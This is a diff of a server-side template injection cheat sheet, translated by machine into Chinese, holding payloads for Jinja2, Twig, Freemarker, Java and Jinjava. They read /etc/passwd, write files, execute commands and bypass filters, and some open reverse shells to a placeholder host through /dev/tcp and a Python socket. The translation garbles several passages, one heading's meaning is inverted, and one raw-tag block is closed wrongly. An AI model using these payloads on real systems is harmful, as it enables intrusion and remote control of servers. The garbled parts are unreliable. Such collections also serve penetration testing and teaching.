@@ -1,8 +1,8 @@
-# Templates Injections
+# Templates 注入
 
-> Template injection allows an attacker to include template code into an existant (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages
+> 模板注入允许攻击者将模板代码包含到现有（或不存在）模板中。模板引擎通过使用静态模板文件（在运行时用HTML页面中的实际值替换变量/占位符）使设计HTML页面变得更容易。
 
-## Summary
+## 概要
 
 * [Tools](#tools)
 * [Methodology](#methodology)
@@ -61,7 +61,7 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 <%= 7 * 7 %>
 ```
 
-### Retrieve /etc/passwd
+### Retrieve/etc/passwd
 
 ```ruby
 <%= File.open('/etc/passwd').read %>
@@ -91,7 +91,7 @@ ${class.getResource("../../../../../index.htm").getContent()}
 ${T(java.lang.System).getenv()}
 ```
 
-### Retrieve /etc/passwd
+### Retrieve/etc/passwd
 
 ```java
 ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
@@ -125,9 +125,11 @@ $output = $twig > render (
 ### Code execution
 
 ```python
+{% raw %}
 {{self}}
 {{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{% endraw %}
 ```
 
 ## Smarty
@@ -143,7 +145,7 @@ You can try your payloads at [https://try.freemarker.apache.org](https://try.fre
 
 ### Basic injection
 
-The template can be `${3*3}` or the legacy `#{3*3}`
+模板可以是`${3*3}`或旧的`{3*3}`
 
 ### Code execution
 
@@ -188,18 +190,22 @@ ${x}
 ## Jinja2
 
 [Official website](http://jinja.pocoo.org/)
-> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  
+
+> Jinja2是一个功能齐全的Python模板引擎。它完全支持unicode，是一个可选的集成沙盒执行环境，广泛使用并获得BSD许可。 
 
 ### Basic injection
 
 ```python
+{% raw %}
 {{4*4}}[[5*5]]
 {{7*'7'}} would result in 7777777
 {{config.items()}}
+{% raw %}
 ```
 
-Jinja2 is used by Python Web Frameworks such as Django or Flask.
-The above injections have been tested on Flask application.
+Jinja2被Python Web框架（如Django或Flask）使用。
+
+上述注射剂已在烧瓶上进行了试验。
 
 ### Template format
 
@@ -218,9 +224,11 @@ The above injections have been tested on Flask application.
 ### Dump all used classes
 
 ```python
+{% raw %}
 {{ [].class.base.subclasses() }}
 {{''.class.mro()[1].subclasses()}}
 {{ ''.__class__.__mro__[2].__subclasses__() }}
+{% endraw %}
 ```
 
 ### Dump all config variables
@@ -235,42 +243,49 @@ The above injections have been tested on Flask application.
 ### Read remote file
 
 ```python
+{% raw %}
 # ''.__class__.__mro__[2].__subclasses__()[40] = File class
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
 {{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
+{% endraw %}
 ```
 
 ### Write into remote file
 
 ```python
+{% raw %}
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
+{% endraw %}
 ```
 
 ### Remote Code Execution
-
-Listen for connexion
 
 ```bash
 nv -lnvp 8000
 ```
 
-#### Exploit the SSTI by calling subprocess.Popen.
-:warning: the number 396 will vary depending of the application.
+#### 通过调用subprocess.Popen利用SSTI。
+:warning: 数字396将根据应用而变化。
 
 ```python
+{% raw %}
 {{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{% endraw %}
 ```
 
-#### Exploit the SSTI by calling Popen without guessing the offset
+#### 通过调用Popen猜测偏移量来利用SSTI
 
 ```python
+{% raw %}
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+{% endraw %}
 ```
 
-#### Exploit the SSTI by writing an evil config file.
+#### 通过编写一个配置文件来利用SSTI。
 
 ```python
 # evil config
+{% raw %}
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 
 
 # load the evil config
@@ -278,6 +293,7 @@ nv -lnvp 8000
 
 # connect to evil host
 {{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }} 
+{% endraw %}
 ```
 
 
@@ -288,9 +304,10 @@ request.__class__
 request["__class__"]
 ```
 
-Bypassing `_`
+绕过`_`
 
 ```python
+{% raw %}
 http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_
 
 {{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
@@ -298,9 +315,10 @@ http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.c
 {{request|attr(["__","class","__"]|join)}}
 {{request|attr("__class__")}}
 {{request.__class__}}
+{% endraw %}
 ```
 
-Bypassing `[` and `]`
+绕过`[` and `]`
 
 ```python
 http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
@@ -308,7 +326,7 @@ or
 http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
 ```
 
-Bypassing `|join`
+绕过 `|join`
 
 ```python
 http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
@@ -319,17 +337,20 @@ http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args
 ### Basic injection
 
 ```python
+{% raw %}
 {{'a'.toUpperCase()}} would result in 'A'
 {{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
+{% endraw %}
 ```
 
-Jinjava is an open source project developped by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)
+Jinjava是Hubspot开发的一个开源项目，可在[https://github.com/Hubspot/Jinjava/]上找到
 
-### Command execution 
+### Code execution
 
-Fixed by https://github.com/HubSpot/jinjava/pull/230
+修正者 https://github.com/HubSpot/jinjava/pull/230
 
 ```python
+{% raw %}
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
 
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
@@ -338,10 +359,11 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 
 
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
+{% endraw %}
 ```
 
 
-## References
+## 工具书类
 
 * [https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
 * [Yahoo! RCE via Spring Engine SSTI](https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/)
